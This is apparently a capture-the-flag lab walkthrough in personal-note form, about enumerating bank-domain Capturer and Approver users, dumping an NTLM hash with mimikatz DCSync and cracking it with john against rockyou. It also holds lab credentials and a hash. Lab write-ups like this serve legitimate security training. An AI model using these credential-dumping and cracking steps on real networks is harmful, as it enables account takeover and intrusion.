Once you have submit the flag 17 you'll get an email with the following message:

![[Enumerate users CAPTURERS and APPROVERS-20240619135517810.webp]]

So to break it down further:

- We need a user account from `Capturers` group,
- We need to log in with this account and capture the transaction,
- We also need to get a user account from `Approvers` group,
- We then need to log in as approver and complete the transaction to achieve the goal,

## Connect to BANKDC via RDP and enumerate the user groups

- Connect from CORPDC to BANKDC `10.200.X.101` with the following credentials:

	Username: `kairosbank`
	Password: `Capstone1@`

- Enumerate the users with the Capturer and Approver Role in the Bank Domain (you can just use the **Active Directory Users and Computers** snap-in):
	![[Enumerate users CAPTURERS and APPROVERS-20240618151057753.webp]]

Notice that there are two groups that we are interested in. Check out the users in each group. You don’t need to compromise all the accounts–just **one account from each group** to complete the task.

![[Enumerate users CAPTURERS and APPROVERS-20240619140440523.webp]]
![[Enumerate users CAPTURERS and APPROVERS-20240619140454701.webp]]

## Dump NTLM hashes for these users

- [[Connect to CORPDC with Administration credentials]]
- <span style="background:#d4b106">RDP to BANKDC with the [[Create user at BANK Forest|new user]].   </span> 
- Open a Powershell on BANKDC as administrator.
- Go to `c:\Users\Administrator.THERESERVE\Downloads`.
- Run `mimikatz`.Password
	-  # privilege::debug
	-  # lsadump::dcsync /user:c.young
		![[Enumerate users CAPTURERS and APPROVERS-20240621144300147.webp]]
	 Hash NTLM: fbdcd5041c96ddbd82224270b57f11fc

### Cracking the hash on your attacking machine

- Create a file with the hash.
	$ `echo "fbdcd5041c96ddbd82224270b57f11fc" > ntlm_hash.c.young.txt`

- Crack the hash with `john`.
	$ `john --wordlist=/usr/share/wordlists/rockyou.txt  --format=NT ntlm_hash.c.young.txt` 
	![[Enumerate users CAPTURERS and APPROVERS-20240621150830988.webp]]

### RDP to JMP

[[RDP to JMP]]

Checking the folders contents you'll find a note for the approver.
- Go to `C:\Users\a.holt\Documents\Swift`.
- Open the swift file.
	![[Enumerate users CAPTURERS and APPROVERS-20240621155345848.webp]]
- 